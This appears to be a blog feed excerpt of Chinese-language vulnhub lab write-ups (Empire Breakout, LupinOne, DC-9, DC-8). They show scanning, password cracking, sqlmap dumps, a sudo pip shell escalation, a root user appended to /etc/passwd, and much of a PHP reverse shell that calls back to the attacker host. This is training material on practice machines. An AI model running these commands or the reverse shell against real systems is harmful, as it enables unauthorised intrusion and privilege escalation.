    <summary type="html">&lt;h1 id=&quot;SQL注入漏洞&quot;&gt;&lt;a href=&quot;#SQL注入漏洞&quot; class=&quot;headerlink&quot; title=&quot;SQL注入漏洞&quot;&gt;&lt;/a&gt;SQL注入漏洞&lt;/h1&gt;&lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;随着互联网web和信息技术的发展，在web后端作为存储和管理的的数据库也得到了广泛的应用，与web结合较为紧密的数据库包括Mysql，Sqlserver，Oracle，Sqllite，Db2，Access等等。 数据存储和管理作为应用的一个基本需求，在绝大多数的应用里都得到了使用，这种大面积的使用也意味着在数据库操作方面如果处理不当出现问题的可能性会很大，另外一方面由于数据库承载了应用的数据信息，如果数据库出现问题一方面可能导致敏感数据的泄露和篡改（如信用卡账户，用户密码，管理账户和密码，销售记录等等），直接导致损失和应用被攻陷，另外一方面，即使数据库中不承载较为敏感的信息，由于数据库的特殊性，数据库被攻击的话也可以直接导致应用程序崩溃及其他严重的后果。&lt;/p&gt;
&lt;h2 id=&quot;漏洞成因&quot;&gt;&lt;a href=&quot;#漏洞成因&quot; class=&quot;headerlink&quot; title=&quot;漏洞成因&quot;&gt;&lt;/a&gt;漏洞成因&lt;/h2&gt;&lt;p&gt;应用为了和数据库进行沟通完成必要的管理和存储工作，必须和数据库保留一种接口。目前的数据库一般都是提供api以支持管理，应用使用底层开发语言如Php，Java，asp，Python与这些api进行通讯。对于数据库的操作，目前普遍使用一种SQL语言（Structured Query Language语言，SQL语言的功能包括增删查改等，是一个综合的、通用的关系数据库语言，同时又是一种高度非过程化的语言，只要求用户指出做什么而不需要指出怎么做），SQL作为字符串通过API传入给数据库，数据库将查询的结果返回，数据库自身是无法分辨传入的SQL是合法的还是不合法的，它完全信任传入的数据，如果传入的SQL语句被恶意用户控制或者篡改，将导致数据库以当前调用者的身份执行预期之外的命令并且返回结果，导致安全问题。 那么恶意用户如何才能控制传入的SQL语句呢？我们知道，既然传入的SQL是以字符串的方式传入的，这个字符串由应用生成，那么如果应用生成这个字符串的方式不对就可能导致问题，譬如考虑如下的功能：&lt;/p&gt;</summary>
    
    
    
    <category term="笔记" scheme="https://syst1m.top/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="sql注入" scheme="https://syst1m.top/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-EmpireBreakout</title>
    <link href="https://syst1m.top/2022/06/22/vulnhub-breakout%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/22/vulnhub-breakout%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-22T07:40:10.000Z</published>
    <updated>2022-06-22T08:53:22.425Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulnhub项目  <a href="https://www.vulnhub.com/entry/empire-breakout,751/">https://www.vulnhub.com/entry/empire-breakout,751/</a><br>靶机:172.16.17.152<br>攻击机kali:172.16.17.140</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>使用nmap对靶机进行扫描 开启了三个web服务,和2个smb服务<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221547410.png"></p><p>445高危端口,尝试exp打445端口,失败,继续往下看80端口<br>apache,在前端源码里找到提示和加密密文<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221606870.png"></p><p>挨个尝试解密,最后为Brainfuck加密,解出明文为 .2uqPEfj3D&lt;P’a-3 应该是某个账号的密码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221609231.png"></p><p>挨个访问10000&#x2F;20000端口,都是登录页面,没有利用的点<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221612140.png"></p><h2 id="smb嗅探"><a href="#smb嗅探" class="headerlink" title="smb嗅探"></a>smb嗅探</h2><p>想到smb服务还没有利用到,回过头继续看smb服务<br>enum4linux 对靶机进行嗅探,爆出了一个用户名 cyber</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">enum.exe的Linux替代软件，用于枚举Windows和Samba主机中的数据。</span><br><span class="line">enum4linux 172.16.17.152</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221615489.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><p>登录成功,发现有个地方可以直接执行命令<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221619772.png"></p><p>反弹shell<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221622849.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221622106.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看root权限执行的命令,和文件,没有sudo命令,没有利用的点<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221627684.png"></p><p>拿到第一个flag和一个root权限的 tar命令<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221630268.png"></p><p>既然有tar,那么就要用到压缩 解压去提权,最后在&#x2F;var&#x2F;backups下翻到一个密码备份文件<br>对密码的备份文件进行压缩，然后解压即可么访问拿到密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./tar -czvf test.tar.gz /var/backups/.old_pass.bak</span><br><span class="line">tar -xzvf test.tar.gz</span><br><span class="line"><span class="built_in">cat</span> var/backups/.old_pass.bak</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221650882.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206221649498.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;vulnhub项目  &lt;a href=&quot;https://www.vulnhub.com/entry/empire-breakout,751/&quot;&gt;https://www.vulnhub.com/entry/empire-breakout,751/&lt;/a&gt;&lt;br&gt;靶机:172.16.17.152&lt;br&gt;攻击机kali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;使用nmap对靶机进行扫描 开启了三个web服务,和2个smb服务&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206221547410.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;445高危端口,尝试exp打445端口,失败,继续往下看80端口&lt;br&gt;apache,在前端源码里找到提示和加密密文&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206221606870.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>vulnhub-EmpireLupinOne打靶</title>
    <link href="https://syst1m.top/2022/06/21/vulnhub-Empire%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/21/vulnhub-Empire%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-21T10:10:30.000Z</published>
    <updated>2022-06-22T07:50:01.542Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulnhub项目 <a href="https://www.vulnhub.com/series/empire,507/">https://www.vulnhub.com/series/empire,507/</a><br>靶机:172.16.17.151<br>攻击机kali:172.16.17.140</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>nmap扫描确定靶机ip,再详细扫描<br>开放了22和80,扫出一个&#x2F;~myfiles目录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211837023.png"></p><p>访问看看,提示404,暗示我们继续尝试当前目录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211838965.png"></p><h2 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h2><p>wfuzz继续扫当前目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://172.16.17.151/~FUZZ</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211859278.png"></p><p>提示我们icex64用户有ssh秘钥,并使用fasttrack去爆破<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211901501.png"></p><p>继续爆破,扫出一个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404,403 -u http://172.16.17.151/~secret/.FUZZ.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211916638.png"></p><p>但是应该是加密过的,不是ssh密钥<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211917480.png"></p><p>拿去解密,挨个尝试后,以base58解出秘钥<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211922436.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="爆破秘钥"><a href="#爆破秘钥" class="headerlink" title="爆破秘钥"></a>爆破秘钥</h2><p>使用ssh2john将秘钥编译一下,再使用john暴力破解,解出密码 P@55w0rd!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh2john key.txt &gt; passkey.txt</span><br><span class="line">                                                                                                                                                                                                              </span><br><span class="line">john --wordlist=/usr/share/wordlists/fasttrack.txt passkey.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211929056.png"></p><h2 id="尝试登录"><a href="#尝试登录" class="headerlink" title="尝试登录"></a>尝试登录</h2><p>直接登录被拒绝<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211932835.png"></p><p>利用秘钥再次登录,此处要注意,先将秘钥权限改为 600<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211938634.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在家目录下看到一个user.txt,拿到第一个flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211946639.png"></p><p>查看root权限运行的文件,没有写入权限,继续往下看<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211941860.png"></p><p>发现使用webbrowser包,跟进看看<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211952250.png"></p><p>是root权限<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206211953957.png"></p><p>写入shell<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206212014187.png"></p><p>运行heist.py反弹shell<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206212015303.png"></p><p>查看arsene用户下以root权限运行的命令或文件,发现pip不需要密码就可以执行<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206212016681.png"></p><p>google pip提权 找到方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arsene@LupinOne:~$ TF=$(<span class="built_in">mktemp</span> -d)</span><br><span class="line">arsene@LupinOne:~$ <span class="built_in">echo</span> <span class="string">&quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;<span class="subst">$(tty)</span> &gt;<span class="subst">$(tty)</span> 2&gt;<span class="subst">$(tty)</span>&#x27;)&quot;</span> &gt; <span class="variable">$TF</span>/setup.py</span><br><span class="line">arsene@LupinOne:~$ sudo pip install <span class="variable">$TF</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206212029257.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;vulnhub项目 &lt;a href=&quot;https://www.vulnhub.com/series/empire,507/&quot;&gt;https://www.vulnhub.com/series/empire,507/&lt;/a&gt;&lt;br&gt;靶机:172.16.17.151&lt;br&gt;攻击机kali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;nmap扫描确定靶机ip,再详细扫描&lt;br&gt;开放了22和80,扫出一个&amp;#x2F;~myfiles目录&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206211837023.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;访问看看,提示404,暗示我们继续尝试当前目录&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206211838965.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="ssh" scheme="https://syst1m.top/tags/ssh/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-dc9打靶</title>
    <link href="https://syst1m.top/2022/06/18/vulnhub-dc9%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/18/vulnhub-dc9%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-18T10:43:50.000Z</published>
    <updated>2022-06-21T10:10:08.807Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulnhub项目 <a href="https://www.vulnhub.com/entry/dc-9,412/">https://www.vulnhub.com/entry/dc-9,412/</a><br>靶机:172.16.17.150<br>攻击机kali:172.16.17.140</p><h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181846501.png"></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>nmap扫描靶机,存在22端口,但是状态为filtered,怀疑被knockd保护<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181847274.png"></p><p>扫目录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181900356.png"></p><p>web指纹<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181848261.png"></p><p>挨个访问扫出来的目录,在访问session.php的时候发现已经登录,在下面提示文件不存在,可能存在文件包含漏洞<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181903758.png"></p><p>猜一下接受参数的变量名,成功读取<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181915830.png"></p><p>上面怀疑ssh被保护,现在用文件包含读取一下<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181919654.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>文件包含没有能继续利用的电,查看其他功能点,发现一处搜索框,post传输数据,有搜索就有数据库交互,抓包fuzz<br>当语句为’or 1&#x3D;1 #时,产生注入,丢到sqlmap跑<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181944447.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181947908.png"></p><p>跑出账号密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 1.txt -batch -D <span class="built_in">users</span> -T <span class="string">&#x27;UserDetails&#x27;</span> -C <span class="string">&#x27;password,username&#x27;</span> --dump</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181952744.png"></p><h2 id="knock碰撞ssh"><a href="#knock碰撞ssh" class="headerlink" title="knock碰撞ssh"></a>knock碰撞ssh</h2><p>安装knockd<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181930687.png"></p><p>根据刚刚读到的端口,去敲门,逆序端口号,发现ssh已经对我们开放<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181937749.png"></p><h2 id="撞库"><a href="#撞库" class="headerlink" title="撞库"></a>撞库</h2><p>利用跑出来的账号密码,拿去撞ssh,跑出三个账号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P passwords.txt 172.16.17.150 ssh</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206181959848.png"></p><p>相继进入几个账号,翻翻翻*10,最后在janitor找到一个密码文件<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206182008193.png"></p><p>复制进passwd文件继续爆破,爆出一个新的账号<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206182010559.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>登录看看以root权限运行的文件<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206182014091.png"></p><p>find查找路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name test.py -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206182016074.png"></p><p>分析第一个test.py文件,读取第一个文件的内容,添加到第二个文件的末尾<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206182022009.png"></p><p>生成一个密码hash,账号为domon 密码 123456</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt demon 123456</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206182038473.png"></p><p>将生成的密码hash写入一个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;demon:$1$demon$Mspg7FhbFwGLZ4T2s/qI6/:0:0:root:/bin/bash&#x27;</span> &gt;&gt; /tmp/demon</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206182039239.png"></p><p>再利用test命令写入&#x2F;etc&#x2F;passwd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /opt/devstuff/dist/test/test ./demon /etc/passwd</span><br></pre></td></tr></table></figure><p>登录demon,拿到flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206182041961.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;vulnhub项目 &lt;a href=&quot;https://www.vulnhub.com/entry/dc-9,412/&quot;&gt;https://www.vulnhub.com/entry/dc-9,412/&lt;/a&gt;&lt;br&gt;靶机:172.16.17.150&lt;br&gt;攻击机kali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;描述&quot;&gt;&lt;a href=&quot;#描述&quot; class=&quot;headerlink&quot; title=&quot;描述&quot;&gt;&lt;/a&gt;描述&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206181846501.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="apache" scheme="https://syst1m.top/tags/apache/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-dc8打靶</title>
    <link href="https://syst1m.top/2022/06/16/vulnhub-dc8%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/16/vulnhub-dc8%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-16T11:48:19.000Z</published>
    <updated>2022-06-17T11:05:09.104Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulnhub <a href="https://www.vulnhub.com/entry/dc-8,367/">https://www.vulnhub.com/entry/dc-8,367/</a><br>靶机:172.16.17.149<br>攻击机kali:172.16.17.140</p><h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171603251.png"></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>nmap扫描靶机<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171605915.png"></p><p>访问首页的时候发现一处url带id字样,打上一个单引号,发现报错<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171613764.png"></p><p>尝试注入<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171616391.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>##sql注入<br>丢到sqlmap跑<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171616126.png"></p><p>跑出账号密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%sqlmap -u http://172.16.17.149/?nid=3 -D d7db -T <span class="built_in">users</span> --dump -C <span class="string">&quot;name,pass&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171624065.png"></p><p>但是md5解不出,看到账号里有一个john,提示我们使用john工具<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171641368.png"></p><p>跑出一个密码turtle</p><p>从robots.txt知道后台地址<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171644855.png"></p><p>尝试登录,john用户登录成功</p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>一直翻翻翻,在下面这个url翻到一个功能点,可以执行php代码<br><a href="http://172.16.17.149/node/3#overlay-context=user&amp;overlay=node/3/webform/configure">http://172.16.17.149/node/3#overlay-context=user&amp;overlay=node/3/webform/configure</a></p><p>写反弹shell语句,需要注意,要再代码前面添加一些字符串,不然不会被执行<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171814251.png"></p><p>webshell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">// php-reverse-shell - A Reverse Shell implementation in PHP</span></span><br><span class="line">  <span class="comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">set_time_limit</span> (<span class="number">0</span>);</span><br><span class="line">  <span class="variable">$VERSION</span> = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="string">&#x27;172.16.17.140&#x27;</span>;  <span class="comment">// You have changed this</span></span><br><span class="line">  <span class="variable">$port</span> = <span class="number">9999</span>;  <span class="comment">// And this</span></span><br><span class="line">  <span class="variable">$chunk_size</span> = <span class="number">1400</span>;</span><br><span class="line">  <span class="variable">$write_a</span> = <span class="literal">null</span>;</span><br><span class="line">  <span class="variable">$error_a</span> = <span class="literal">null</span>;</span><br><span class="line">  <span class="variable">$shell</span> = <span class="string">&#x27;uname -a; w; id; /bin/sh -i&#x27;</span>;</span><br><span class="line">  <span class="variable">$daemon</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="variable">$debug</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Daemonise ourself if possible to avoid zombies later</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// pcntl_fork is hardly ever available, but will allow us to daemonise</span></span><br><span class="line">  <span class="comment">// our php process and avoid zombies.  Worth a try...</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;pcntl_fork&#x27;</span>)) &#123;</span><br><span class="line">    <span class="comment">// Fork and have the parent process exit</span></span><br><span class="line">    <span class="variable">$pid</span> = <span class="title function_ invoke__">pcntl_fork</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$pid</span> == -<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Can&#x27;t fork&quot;</span>);</span><br><span class="line">      <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$pid</span>) &#123;</span><br><span class="line">      <span class="keyword">exit</span>(<span class="number">0</span>);  <span class="comment">// Parent exits</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Make the current process a session leader</span></span><br><span class="line">    <span class="comment">// Will only succeed if we forked</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">posix_setsid</span>() == -<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">printit</span>(<span class="string">&quot;Error: Can&#x27;t setsid()&quot;</span>);</span><br><span class="line">      <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$daemon</span> = <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">printit</span>(<span class="string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);</span><br><span class="line">  